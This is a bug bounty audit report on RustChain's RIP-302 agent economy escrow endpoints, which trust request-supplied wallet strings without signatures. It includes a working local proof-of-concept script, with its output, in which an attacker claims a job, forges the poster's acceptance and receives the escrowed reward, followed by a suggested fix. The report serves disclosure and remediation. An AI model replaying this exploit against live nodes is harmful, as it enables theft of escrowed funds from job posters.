# Critical RIP-302 Audit: Agent Economy Escrow Release Auth Bypass

## Metadata

- Bounty: rustchain-bounties #71
- Related surface: RIP-302 Agent Economy, rustchain-bounties #683/#685
- Auditor: maelrx
- Wallet: RTCc068d2850639325b847e09fc6b8c01b0b88d7be8
- Repository: Scottcjn/Rustchain
- Commit reviewed: 0c428794e85db8ef5a64639e4ccd9b121e40cab1
- Files reviewed: `rip302_agent_economy.py`

## Finding

### Critical: Any caller can claim a funded job, impersonate the poster, and release escrow to the caller-controlled worker wallet

RIP-302 stores real RTC escrow when a poster creates an agent job. The lifecycle endpoints identify the acting wallet only by JSON string fields such as `poster_wallet` and `worker_wallet`. The code checks that the supplied string equals the job's stored poster or worker, but it never requires a wallet signature, session, API key, nonce, or any proof that the caller controls that wallet.

An attacker who sees a public open job can:

1. Claim it with an attacker-controlled `worker_wallet`.
2. Submit any deliverable as that worker.
3. Call `/agent/jobs/<job_id>/accept` with `poster_wallet` set to the public poster wallet.
4. Receive the job reward from escrow.

The local PoC below shows a 100 RTC job being paid to `attacker_worker` with no poster secret or signature. The poster loses the escrowed 105 RTC total, the attacker receives 100 RTC, and the platform fee is collected.

## Location

- `rip302_agent_economy.py:233`: `/agent/jobs` trusts `poster_wallet` from request JSON before debiting escrow.
- `rip302_agent_economy.py:348`: `/agent/jobs/<job_id>/claim` trusts `worker_wallet` from request JSON.
- `rip302_agent_economy.py:419`: `/agent/jobs/<job_id>/deliver` trusts `worker_wallet` from request JSON.
- `rip302_agent_economy.py:476`: `/agent/jobs/<job_id>/accept` trusts `poster_wallet` from request JSON before releasing escrow.
- `rip302_agent_economy.py:591`: `/agent/jobs/<job_id>/dispute` has the same poster-string ownership weakness.
- `rip302_agent_economy.py:645`: `/agent/jobs/<job_id>/cancel` has the same poster-string ownership weakness for refund/cancellation.

## Root Cause

The ownership checks compare request-supplied strings to stored wallet strings, but there is no cryptographic authentication for the actor.

```python
poster = str(data.get("poster_wallet", "")).strip()
...
if j["poster_wallet"] != poster:
    return jsonify({"error": "Only the poster can accept delivery"}), 403
...
_adjust_balance(c, ESCROW_WALLET, -escrow_i64)
_adjust_balance(c, worker, reward_i64)
_adjust_balance(c, PLATFORM_FEE_WALLET, fee_i64)
```

This proves only that the caller knows the poster wallet string. Job details expose `poster_wallet`, and the listing endpoint also returns it, so the value is public.

## Local Reproduction

Run from repository root. This uses only a temporary SQLite database and Flask `test_client`; no live RustChain node is contacted.

```bash
uv run --no-project --with flask python - <<'PY'
import os, sqlite3, tempfile
from flask import Flask
from rip302_agent_economy import register_agent_economy

fd, db_path = tempfile.mkstemp(prefix='rip302-auth-bypass-', suffix='.db')
os.close(fd)
try:
    with sqlite3.connect(db_path) as conn:
        conn.execute('CREATE TABLE balances (miner_id TEXT PRIMARY KEY, amount_i64 INTEGER NOT NULL DEFAULT 0)')
        conn.execute('INSERT INTO balances (miner_id, amount_i64) VALUES (?, ?)', ('victim_poster', 1_000_000_000))
        conn.commit()

    app = Flask(__name__)
    register_agent_economy(app, db_path)
    client = app.test_client()

    def bal(wallet):
        with sqlite3.connect(db_path) as conn:
            row = conn.execute('SELECT amount_i64 FROM balances WHERE miner_id=?', (wallet,)).fetchone()
            return 0 if row is None else int(row[0])

    def rtc(i64):
        return i64 / 1_000_000

    print('initial:', {w: rtc(bal(w)) for w in ['victim_poster', 'attacker_worker', 'agent_escrow', 'founder_community']})

    post = client.post('/agent/jobs', json={
        'poster_wallet': 'victim_poster',
        'title': 'Legitimate paid code review',
        'description': 'Review a large production diff and provide a complete report.',
        'category': 'code',
        'reward_rtc': 100,
        'ttl_seconds': 3600,
    })
    job_id = post.get_json()['job_id']
    print('post_job:', post.status_code, post.get_json())
    print('after_post:', {w: rtc(bal(w)) for w in ['victim_poster', 'attacker_worker', 'agent_escrow', 'founder_community']})

    claim = client.post(f'/agent/jobs/{job_id}/claim', json={'worker_wallet': 'attacker_worker'})
    print('attacker_claim:', claim.status_code, claim.get_json())

    deliver = client.post(f'/agent/jobs/{job_id}/deliver', json={
        'worker_wallet': 'attacker_worker',
        'result_summary': 'malicious placeholder deliverable',
    })
    print('attacker_deliver:', deliver.status_code, deliver.get_json())

    accept = client.post(f'/agent/jobs/{job_id}/accept', json={
        'poster_wallet': 'victim_poster',
        'rating': 5,
    })
    print('forged_poster_accept:', accept.status_code, accept.get_json())
    print('final:', {w: rtc(bal(w)) for w in ['victim_poster', 'attacker_worker', 'agent_escrow', 'founder_community']})
finally:
    os.unlink(db_path)
PY
```

Observed result:

```text
initial: {'victim_poster': 1000.0, 'attacker_worker': 0.0, 'agent_escrow': 0.0, 'founder_community': 0.0}
post_job: 201 {... 'escrow_total_rtc': 105.0, 'poster_wallet': 'victim_poster', 'reward_rtc': 100.0, 'status': 'open'}
after_post: {'victim_poster': 895.0, 'attacker_worker': 0.0, 'agent_escrow': 105.0, 'founder_community': 0.0}
attacker_claim: 200 {... 'status': 'claimed', 'worker_wallet': 'attacker_worker'}
attacker_deliver: 200 {... 'status': 'delivered'}
forged_poster_accept: 200 {... 'message': 'Job complete! 100.0 RTC paid to attacker_worker.', 'status': 'completed'}
final: {'victim_poster': 895.0, 'attacker_worker': 100.0, 'agent_escrow': 0.0, 'founder_community': 5.0}
```

## Expected vs Actual

Expected:

- Escrow-releasing actions must require proof that the caller controls the poster wallet.
- Worker actions must require proof that the caller controls the worker wallet.
- A public wallet string must not authorize balance movement.

Actual:

- `/agent/jobs/<job_id>/accept` releases escrow when the request body contains the correct public `poster_wallet` string.
- `/agent/jobs/<job_id>/claim` and `/agent/jobs/<job_id>/deliver` bind the attacker-controlled worker wallet using only a request string.
- The attacker receives the reward and the job is marked completed.

## Impact

- Direct fund theft from any funded RIP-302 job escrow.
- Loss is bounded per job by the posted reward plus fee, but the endpoint allows rewards up to 10,000 RTC per job.
- Public job listing and job detail responses expose enough information to target open jobs.
- The same root cause also enables unauthorized poster-side dispute/cancel actions and worker-side deliverable tampering.

This maps to the #71 Critical class because it is fund theft from escrow and an authorization bypass on payment release.

## Suggested Fix

1. Require signed wallet authorization for every state-changing RIP-302 endpoint.
   - Use the same Ed25519 wallet model as `/wallet/transfer/signed`.
   - Include `job_id`, action, actor wallet, request body hash, nonce, and timestamp in the signed payload.
   - Derive the wallet from `public_key` and reject if it does not match the stored poster/worker for poster/worker-scoped actions.
2. Add replay protection for RIP-302 action nonces.
3. Keep the existing atomic state-transition guards; they fix races but not actor authentication.
4. Add regression tests:
   - forged poster accept is rejected;
   - forged poster cancel/dispute is rejected;
   - forged worker deliver is rejected;
   - valid signed poster accept still releases escrow once.

## Duplicate Triage

Searched existing RustChain issues and PRs before filing:

- `"RIP-302" "auth"` in `Scottcjn/rustchain-bounties` and `Scottcjn/Rustchain`
- `"agent economy" "signature"` in both repos
- `"agent/jobs" "accept" "poster_wallet"` in both repos
- `"Only the poster can accept"` in both repos
- `"poster_wallet" "worker_wallet" "accept" "security"` in both repos

Results surfaced RIP-302 feature bounties and SDK/integration PRs, but no existing report for forged actor authorization causing escrow theft. PRs around #2867 address atomic state races in the same file, but the vulnerable code path still has no actor signature.

## Confidence

- Overall confidence: 0.94
- Reproduction confidence: 0.98
- Severity confidence: 0.91
